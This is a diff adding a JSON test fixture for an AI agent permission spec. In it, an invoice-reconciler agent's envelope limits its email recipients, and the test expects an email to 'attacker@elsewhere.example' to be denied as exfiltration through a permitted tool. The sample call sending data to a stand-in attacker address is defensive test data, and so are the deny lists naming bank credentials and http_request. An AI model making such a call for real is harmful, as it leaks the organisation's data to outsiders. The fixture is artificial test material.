@@ -1,0 +1,90 @@
+{
+  "name": "contacting someone outside recipients.allow is denied",
+  "spec_rule": 6,
+  "decided_by": "recipients",
+  "why_it_matters": "This is exfiltration by a permitted tool. send_email is granted; the destination is not.",
+  "envelope": {
+    "intent_envelope": "0.1",
+    "id": "invoice-reconciler",
+    "revision": 3,
+    "purpose": "Reconcile this month's supplier invoices against the ledger and flag mismatches for a human.",
+    "principal": {
+      "agent_identity": "invoice-reconciler",
+      "on_behalf_of": "finance.ap_team"
+    },
+    "tools": {
+      "allow": [
+        {
+          "name": "ledger_search",
+          "constraints": {
+            "period": "current_month",
+            "max_rows": 500
+          }
+        },
+        {
+          "name": "send_email",
+          "constraints": {
+            "template": "mismatch_summary"
+          }
+        }
+      ],
+      "deny": [
+        "issue_payment",
+        "http_request"
+      ]
+    },
+    "data": {
+      "allow": [
+        "ledger:read:current_month",
+        "invoices:read"
+      ],
+      "deny": [
+        "payroll",
+        "bank.credentials"
+      ]
+    },
+    "recipients": {
+      "allow": [
+        "ap-team@example.com"
+      ],
+      "max_per_run": 3
+    },
+    "limits": {
+      "max_tool_calls": 20,
+      "max_records": 500,
+      "max_spend_usd": 2.0,
+      "max_runtime_seconds": 300
+    },
+    "escalate": [
+      {
+        "when": "mismatch_value_gbp > 10000",
+        "to": "ap-duty-controller",
+        "timeout_seconds": 3600
+      }
+    ],
+    "on_no_response": "deny",
+    "expires": "2027-06-30T23:59:59Z"
+  },
+  "call": {
+    "tool": "send_email",
+    "arguments": {
+      "template": "mismatch_summary"
+    },
+    "data": [],
+    "recipients": [
+      "attacker@elsewhere.example"
+    ]
+  },
+  "state": {
+    "now": "2026-11-02T12:00:00Z",
+    "tool_calls_made": 0,
+    "records_returned": 0,
+    "spend_usd": 0.0,
+    "runtime_seconds": 10,
+    "recipients_contacted": 0
+  },
+  "expect": {
+    "result": "deny",
+    "rule": "recipients"
+  }
+}
